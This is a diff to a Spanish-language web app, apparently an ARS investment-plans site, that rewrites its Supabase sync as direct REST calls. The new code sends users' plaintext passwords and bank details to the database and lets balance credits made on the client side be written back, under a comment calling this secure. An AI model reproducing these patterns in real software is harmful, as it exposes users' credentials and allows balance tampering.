@@ -9,8 +9,6 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 
-  <!-- Librería Supabase y Tailwind CSS -->
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   
@@ -260,11 +258,11 @@
             </div>
             <div class="subbox-theme p-2.5 bg-slate-50 rounded-xl border border-slate-100">
               <span class="text-[10px] text-slate-400 block text-sub">EN REVISIÓN</span>
-              <strong id="profile-pending-ars" class="text-xs text-amber-600 font-bold">$0</strong>
+              <strong id="profile-pending-ars" class="text-xs text-amber-600 font-bold text-main">$0</strong>
             </div>
             <div class="subbox-theme p-2.5 bg-slate-50 rounded-xl border border-slate-100">
               <span class="text-[10px] text-slate-400 block text-sub">RETIRADO</span>
-              <strong id="profile-withdrawn-ars" class="text-xs text-sky-700 font-bold">$0</strong>
+              <strong id="profile-withdrawn-ars" class="text-xs text-sky-700 font-bold text-main">$0</strong>
             </div>
           </div>
         </div>
@@ -337,7 +335,7 @@
       </div>
     </div>
 
-    <!-- BARRA INFERIOR -->
+    <!-- NAVEGACIÓN -->
     <nav class="fixed bottom-0 left-1/2 -translate-x-1/2 w-full max-w-sm bg-white/95 backdrop-blur-md border-t border-sky-200 grid grid-cols-4 py-2 px-2 text-center text-xs z-40 gap-1 shadow-lg">
       <button onclick="switchTab('planes')" id="nav-btn-planes" class="bg-sky-600 text-white py-2 rounded-xl font-bold flex flex-col items-center gap-0.5 shadow-sm transition">
         <i class="fa-solid fa-chart-pie text-sm"></i>
@@ -515,19 +513,33 @@
 
   </main>
 
-  <!-- LÓGICA JAVASCRIPT SIN TRABAS Y CONECTADA A SUPABASE -->
+  <!-- LÓGICA JAVASCRIPT CONEXIÓN EXACTA A SUPABASE -->
   <script>
-    // Inicialización de Supabase con tu clave real
-    const SUPABASE_URL = "https://jsixgpftuhtepudyektf.supabase.co";
-    const SUPABASE_ANON_KEY = "sb_publishable_1I5At-aenvWS_w6YhDLu9w_rkAeGHjL";
-    let supabaseClient = null;
+    const SUPABASE_API_URL = "https://jsixgpftuhtepudyektf.supabase.co/rest/v1";
+    const SUPABASE_PUBLISHABLE_KEY = "sb_publishable_1I5At-aenvWS_w6YhDLu9w_rkAeGHjL";
 
-    try {
-      if (window.supabase) {
-        supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+    // Función que envía datos a Supabase sin trabar la interfaz
+    async function syncUserToSupabase(userData) {
+      try {
+        const response = await fetch(`${SUPABASE_API_URL}/usuarios`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'apikey': SUPABASE_PUBLISHABLE_KEY,
+            'Authorization': `Bearer ${SUPABASE_PUBLISHABLE_KEY}`,
+            'Prefer': 'resolution=merge-duplicates'
+          },
+          body: JSON.stringify(userData)
+        });
+        if (response.ok) {
+          console.log("Usuario sincronizado exitosamente con Supabase");
+        } else {
+          const errText = await response.text();
+          console.warn("Respuesta Supabase:", errText);
+        }
+      } catch (err) {
+        console.warn("Fallo de red al sincronizar con Supabase:", err);
       }
-    } catch(err) {
-      console.warn("Supabase bypassed:", err);
     }
 
     const plans = [
@@ -634,7 +646,7 @@
       }
     }
 
-    // ACCESO INMEDIATO SIN CONFLICTOS + REGISTRO EN SUPABASE
+    // ACCESO INMEDIATO SIN CONFLICTOS + REGISTRO SEGURO EN SUPABASE
     window.handleLoginDirecto = function() {
       const phoneInput = document.getElementById('auth-phone');
       const passInput = document.getElementById('auth-pass');
@@ -661,7 +673,7 @@
       appState.pass = pass;
       saveLocal();
 
-      // 1. Destruir el telón visual inmediatamente
+      // 1. Destruir la pantalla de acceso en el acto
       const authScreen = document.getElementById('auth-screen');
       if (authScreen) {
         authScreen.remove();
@@ -669,20 +681,15 @@
       document.getElementById('user-display-phone').innerText = appState.phone;
       renderUI();
 
-      // 2. Insertar / Actualizar en Supabase en segundo plano
-      if (supabaseClient) {
-        supabaseClient.from('usuarios').upsert({
-          phone: phone,
-          pass: pass,
-          name: appState.name || '',
-          cvu: appState.cvu || '',
-          alias: appState.alias || '',
-          balance: appState.balance || 0
-        }, { onConflict: 'phone' }).then(({ error }) => {
-          if (error) console.warn("Supabase:", error.message);
-          else console.log("Usuario registrado con éxito en Supabase");
-        }).catch(err => console.warn("Fallo Supabase:", err));
-      }
+      // 2. Guardar en Supabase en segundo plano con la clave correcta
+      syncUserToSupabase({
+        phone: phone,
+        pass: pass,
+        name: appState.name || '',
+        cvu: appState.cvu || '',
+        alias: appState.alias || '',
+        balance: appState.balance || 0
+      });
     };
 
     document.getElementById('btn-logout').addEventListener('click', () => {
@@ -986,12 +993,16 @@
       appState.alias = document.getElementById('prof-alias-input').value.trim();
       saveLocal();
 
-      if (supabaseClient && appState.phone) {
-        supabaseClient.from('usuarios').update({
+      // Actualizar datos bancarios en Supabase
+      if (appState.phone) {
+        syncUserToSupabase({
+          phone: appState.phone,
+          pass: appState.pass,
           name: appState.name,
           cvu: appState.cvu,
-          alias: appState.alias
-        }).eq('phone', appState.phone).then(() => {}).catch(() => {});
+          alias: appState.alias,
+          balance: appState.balance
+        });
       }
 
       alert("Datos bancarios guardados.");
@@ -1023,6 +1034,15 @@
       appState.balance += amt;
       if (appState.pending >= amt) appState.pending -= amt;
       saveLocal();
+
+      if (appState.phone) {
+        syncUserToSupabase({
+          phone: appState.phone,
+          pass: appState.pass,
+          balance: appState.balance
+        });
+      }
+
       alert(`$${fmt(amt)} ARS acreditados.`);
       closeAdminModal();
     });
@@ -1030,6 +1050,15 @@
     document.getElementById('btn-admin-validate-guest').addEventListener('click', () => {
       appState.balance += 1000;
       saveLocal();
+
+      if (appState.phone) {
+        syncUserToSupabase({
+          phone: appState.phone,
+          pass: appState.pass,
+          balance: appState.balance
+        });
+      }
+
       alert("Invitado validado (+ $1.000 ARS).");
       closeAdminModal();
     });
